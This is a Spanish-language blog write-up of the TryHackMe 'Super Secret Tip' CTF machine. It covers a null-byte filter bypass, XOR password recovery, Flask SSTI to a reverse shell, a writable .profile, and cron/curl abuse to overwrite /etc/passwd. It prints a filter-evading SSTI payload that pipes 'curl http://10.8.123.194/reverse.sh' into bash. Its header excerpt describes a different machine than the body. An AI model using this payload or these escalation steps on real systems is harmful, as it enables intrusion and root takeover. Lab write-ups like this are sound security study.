---
layout: single
title: Super Secret Tip - TryHackMe
excerpt: "Debemos encontrar 2 banderas. Primero, a partir de un escaneo de puertos pude saber que un servidor FTP permitía conexiones anónimas,logrando enumerar un recurso compartido que contenía un mensaje codificado con Base64 y Vigenere. Además, para conocer la clave utilizada en el cifrado Vigenere, observe el espectrograma de un archivo de audio, que fue encontrado a partir de una fuerza bruta de directorios desde el directorio raíz del servidor web. Luego, de decodificar y descifrar el mensaje, logre saber el password de un usuario local del sistema destino. Luego, en la escalada de privilegio horizontal, aproveche que un script Python era ejecutado de manera periódica y automatizada con los privilegios de un usuario local, logrando realizar un Command Injection para ejecutar una reverse Shell con los privilegios de dicho usuario. Luego, en la escalada de privilegios vertical, aproveche que el usuario pertenencia al grupo secundario lxd para ejecutar un contenedor donde se ejecuta una Shell Bash con privilegios de root, y monte el directorio raíz del sistema anfitrión en uno de sus directorios."
date: 2024-01-21
classes: wide
header:
  teaser: /assets/images/Secure/image003.png
  teaser_home_page: true
  icon: /assets/images/descarga7.webp
categories:
  - TryHackMe
  - ctf
tags:
  - Linux  
  - OpenVPN
  - Nmap
  - Python
  - Flask
  - Burp Suite
  - Gobuster
  - File Download
  - Flask-unsign
  - SSTI
  - Docker
  - .profile
  - Crontab
  - Cifrado XOR
  - HTML
  - HTTP
  - SSH
  - openssl 
---

![](/assets/images/Secure/image001.png)

## SUMMARY

Debemos encontrar 2 bandera. Primero, a partir de un escaneo de puertos pude saber que había un servidor utilizado para desplegar una aplicación web desarrollada conFlask. Luego, utilice fuerza bruta de directorios desde el directorio raíz de la aplicación, logrando encontrar un recurso que presentaba la funcionalidad de “Descargar archivos” desde el directorio raíz de la aplicación web, pero presentaba un analizador de extensiones que logre bypassear con el fin de observar el código fuente de la aplicación, y analizar la lógica seguida en otra funcionalidad llamada “Debugger” que te permitía ingresar datos en una plantilla que iba a ser renderizada, pero presentaba una lista negra con ciertos caracteres prohibidos, pero logre ejecutar una reverse Shell, logrando acceder a un contenedor Docker. Luego, en la escalada de privilegio horizontal, aproveche que tenia el permiso de escritura sobre el archivo oculto “.profile” para ejecutar una reverse Shell con los privilegios de otro usuario. Luego, en la escalada vertical, aproveche que una tarea cron ejecutaba el comando curl con los privilegios de root, para modificar el archivo /etc/passwd del sistema destino.

## FASE RECONOCMIENTO 

En este caso debemos acceder al sistema destino y obtener las banderas. Primero, empezaremos utilizando el comando openvpn y el archivo de configuración OpenVPN con el fin de establecer una conexión VPN y poder acceder a los laboratorios donde están las máquinas virtuales. Además, la plataforma de Tryhackme nos muestra la dirección IP de la máquina Super Secret Tip V1.4.

![](/assets/images/Secure/image005.png)

## FASE ESCANEO Y ENUMERACION

Ahora pasaremos a la fase de Escaneo y Enumeración con el fin de poder escanear los puertos del sistema destino. Además, obtendremos los servicios que se han levantado en los puertos abiertos, las versiones de los servicios.

![](/assets/images/Secure/image007.png)

Los resultados que obtenemos son:
- Un programa servidor SSH que se ejecuta en el puerto 22.
- Un servidor que se ejecuta en el puerto 7777 y que se suele estar integrado en el framework Flask para desplegar aplicaciones web.

Ahora observaremos las caracteristicas y funcionalidades que pueda presentar la aplicación web desde mi navegador web. Podemos observar que la mayoria de las funcionalidades de la aplicación web no han sido desarrolladas aun ya que nos redirigen a la pagina web de inicio de la aplicación web.

![](/assets/images/Secure/image009.png)

![](/assets/images/Secure/image011.png)

![](/assets/images/Secure/image013.png)

Ahora realizaremos fuerza bruta de directorios desde el directorios raiz de la aplicación web con el fin de encontrar recursos escondidos que puedan tener funcionalidades administrativas.

![](/assets/images/Secure/image015.png)

Podemos observar que se logro encontrar dos recursos escondidos. Ahora accederemos a cada uno desde nuestro navegador web.

### Recurso: cloud

![](/assets/images/Secure/image017.png)

![](/assets/images/Secure/image019.png)

![](/assets/images/Secure/image021.png)

![](/assets/images/Secure/image023.png)

Podemos observar que se presenta una funcionalidad de descargar archivos que deben estar almacenados en algun subdirectorio del directorio raiz de la aplicación web. Ademas, algunos de los archivos listados en el formulario ya no estan disponible. 

## FASE GANAR ACCESO O HACKING O EXPLOTACION

Ahora, intentaremos descargar otros recursos escondidos que pudieran haber en el subdirectorio que se ha configurado en la funcionalidad.

![](/assets/images/Secure/image025.png)

Podemos observar que logramos encontrar un script en Python que viene a contener el codigo fuente de la aplicación web. Ahora analizaremos el codigo que le corresponde a la funcionalidad “Debugger” del recurso “debug”.

### Recurso: debug

![](/assets/images/Secure/image027.png)

![](/assets/images/Secure/image029.png)

Podemos observar que el recurso presenta un formulario con dos parametros llamados “debug” y “password”. Ademas, este formulario realizara una solicitud GET con tales parametros en su cuertpo, que ejecutara la funcion debug. Las acciones que se realizara la funcion son las siguientes:

- Tomara los valores ingresados en los parametros “debug” y “password”. Ademas, comprobara si los valores ingresados son diferentes a null.

![](/assets/images/Secure/image031.png)

- Ejecutara la funcion “illegal_chars_check” con el fin de saber si el valor ingresado en el parametro “debug” presenta alguno de estos caracteres “’,&,%”. En el caso de no presentar ninguno de estos caracteres, emitira un False la funcion.

![](/assets/images/Secure/image033.png)

- Se le pasara el valor del parametro “password” a la funcion “get_encrypted” del modulo “debugpassword”. Ademas, podemos observar que este modulo viene a ser un script Python que ha sido importado desde el mismo subdirectorio donde “source.py”. Por lo que utilizaremos la funcionalidad Descargar Archivos de la funcion “download” para observar el contenido del modulo “debugpassword”, pero antes debemos darnos cuenta que se ha implementado un analizador de extension que va a tomar los ultimos 4 caracteres del nombre del archivo para verificiar si tiene la extension .txt. Caso contrario, no se descargara nada.

![](/assets/images/Secure/image035.png)

- Para evitar este analizador de extension podemos utilizar NULL BYTES “%00” al final del nombre del archivo para que la extension “.txt” no sea tomada en cuenta, y solo sea util para bypassear el filtro.

![](/assets/images/Secure/image037.png)

- En el modulo “debugpassword” podemos observar que la funcion “get_encrypted” realiza la operación XOR entre cada bit de las secuencias de bytes “ayham” y el valor ingresado en el parametro “password”. Luego, este resultado debe ser igual al valor de la variable “password”, que viene a contener la primera linea o registro del archivo “supersecrettip.txt” que debe estar almacenado en el mismo subdirectorio que “source.py”, por lo tanto, utilizaremos la funcionalidad Descargar Archivos para observar su contenido.

![](/assets/images/Secure/image039.png)

- Sabiendo que podemos aplicar la operación XOR a las secuencias de bytes “\x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e” y “ayham” con el fin de obtener el valor esperado en el parametro “password” del formulario de la funcionalidad Debugger. Luego, se nos generara una cookie de sesion

![](/assets/images/Secure/image041.png)

![](/assets/images/Secure/image043.png)

- Luego, se nos generaran una cookie de sesion . Ademas, esta cookie de sesion va estar formada por los valores ingresados en los campos “debug” y “passowrd” del formulario.

![](/assets/images/Secure/image045.png)

![](/assets/images/Secure/image047.png)

El otro recurso del que esta compuesto la aplicación web viene a ser “debugresult”, y solo acepta solicitudes GET. Ademas, una vez realizada la solicitud, podemos observar que se ejecuta una funcion llamada “debugResult”, cuyo codigo analizaremos detalladamente.

![](/assets/images/Secure/image049.png)

- Se hace un llamado a la funcion checkIP del modulo ip. Ademas, sabemos que este modulo ha sido importado desde el subdirectorio donde esta “source.py” . Por lo tanto, podemos observar su contenido mediante la funcionalidad Descargar Archivos de la funcion “download”. Ademas, utilizaremos los NULL BYTES con el fin de eludir el filtrado del analizador de extensiones.

![](/assets/images/Secure/image051.png)

- Podemos observar que la funcion “checkIP” acepta el parametro “req” que viene a ser el objeto request que contiene nuestra solicitud GET. Ademas, esta funcion va retornar el valor de true si la primera dirrecion IP que contenga la cabecera HTTP “X-Forwarded-For”, que viene a ser utilizado para obtener la dirrecion IP original del sistema quien realizo la solicitud GET, es igual a la dirrecion 127.0.0.1. Esto se hace con el fin de saber si la solicitud GET se esta realizando desde el mismo sistema destino, pero esto puede ser facilmente adulterado con un envio de una solicitud GET con la cabecera HTTP “X-Forwarded-For”.

![](/assets/images/Secure/image053.png)

- Observamos que otra vez se utiliza la funcion “illegal_chars_check” sobre la clave debug de la cookie de sesion asignada al navegador web del usuario. Ademas, se verifica si la cookie de sesion consta de valores no nulos en las claves “debug” y “user_password”. Por ultimo, se renderiza un template que ha sido definido en un string, pero antes de renderizarlo, mediante el metodo “replace” se reemplazara el string “DEBUG HERE” por el valor de la clave “debug” almacenada en la cookie de sesion del usuario.

Despues del todo el analisis, logramos saber que se realiza un inyectado del valor ingresado en el parametro “debug” en la plantilla “template” que se renderiza al acceder al recurso “debugresult” con la dirrecion IP
127.0.0.1 en la cabecera “X-Forwarded-For” en nuestra solicitud GET. Ahora escogeremos un payload adecuado que no contenga los caracteres `‘;&%` con el fin de ingresarlo al campo “debug” del formulario “Debugger” y poder ejecutar una reverse shell.

```
Payload Exitoso: { { request|attr("application")| attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")| attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")| attr("popen")("curl
http://10.8.123.194/reverse.sh |bash")|attr("read")() } }

```
![](/assets/images/Secure/image055.png)

![](/assets/images/Secure/image057.png)

![](/assets/images/Secure/image059.png)

![](/assets/images/Secure/image061.png)

De esta manera logramos obtener acceso al sistema destino mediante la vulnerabilidad SSTI debido a una inadecuada validacion en la datos que se van a inyectar en las templates. Ahora, convertiremos nuestra reverse shell en mas estable e interactiva.

![](/assets/images/Secure/image063.png)

## FASE ESCALADA DE PRIVILEGIOS

Ahora debemos buscar vectores de escalada de privilegios de manera manual con el fin de llegar a ser un usuario con mayores privilegios.

![](/assets/images/Secure/image065.png)

![](/assets/images/Secure/image067.png)

Debido a la poca cantidad de procesos que se ejecutan, y debido a la presencia del archivo oculto en .dockerenv en el directorio raiz, podemos concluir que estamos en un contenedor Docker.

![](/assets/images/Secure/image069.png)

Ademas, nos damos cuenta que el archivo oculto “.profile” del directorio home del usuario local F30s tiene asignado el permiso de escritura para otros usuarios, por lo que podemos modificar su contenido. Aprovecharemos, esto para agregar un comando que nos generara una reverse shell con los privilegios de F30s cuando este inicio sesion en el contenedor Docker.

![](/assets/images/Secure/image071.png)

![](/assets/images/Secure/image073.png)

![](/assets/images/Secure/image075.png)

De esta manera realizamos una escalada de privielgios vertical aprovechando la mala configuracion en los permisos de control de acceso configurado en el archivo oculto “.profile”.

Ahora seguiremos buscando vectores de escalda de privilegios de manera manual con el fin de ser un usuario con mayores privilegios.

![](/assets/images/Secure/image077.png)

Podemos observar que el usuario root ha configurado una tarea cron en el archivo crontab del sistema. Ademas, esta tarea cron ejecutara de manera periodica y automatizada el comando curl con el parametro -K para indicar la ruta de un archivo que contiene configuraciones para la solicitud HTTP que curl realizara. Ademas, este archivo pertenece al directorio home del usuario F30s, por lo tanto, es posible modiificar sus configuraciones.

Ahora, aprovecharemos que se ejecuta este comando con los privilegios de root, para modificar el archivo /etc/passwd del sistema comprometido con el fin de configurar otro usuario con los privilegios de root. Para ello crearemos una copia del archivo /etc/passwd original dei sistema comprometido con el fin de agregarle una linea con los datos del usuario que crearemos. Luego, cargaremos este copia con el curl para que reemplaze al archivo /etc/passwd original del sistema comprometido.

![](/assets/images/Secure/image079.png)

![](/assets/images/Secure/image081.png)

![](/assets/images/Secure/image083.png)

De esta manera logramos ser el usuario root mediante una tarea cron establecido por el usuario root. Ahora buscaremos la segunda bandera en el directorio root del usuario root.

![](/assets/images/Secure/image085.png)

Podemos observar que la bandera esta en formato de bytes. Ademas, hay un archivo llamado secret.txt que esta en formato bytes. Debido a que ambos estaban en formato bye pense que deberia realizar una operación XOR con ambos valores para obtener la bandera autetntica, pero no fue una conjetura correcta. Ademas, otra suposion es que ambas sean el resultado de alguna operación XOR, por lo que deberiamos encontrar la clave utilizada en la operación XOR. Para ello tenemos el siguiente archivo de texto cuyo contenido no tiene un mensaje claro pero al final hace enfasis en la palabra root.

![](/assets/images/Secure/image087.png)

Ahora supondremso que la clave es root, e intentaremos obtener la data en texto plano de las secuencias de bytes de alguno de los archivos secret o flag2.txt .

![](/assets/images/Secure/image089.png)

![](/assets/images/Secure/image091.png)

Podemos observar que cuando aplicamos la operación XOR sobre la secuencia de bytes de “secret.txt” se obtiene un secuencia de numeros pero sus ultimos dos digitos estan ocultos. Para encontrar los ultimos par de digitos crearemos un script en Python que realizara fuerza bruta para encontrar el par de digitos correctos que nos una flag lo mas legible posible.

![](/assets/images/Secure/image093.png)

![](/assets/images/Secure/image095.png)





















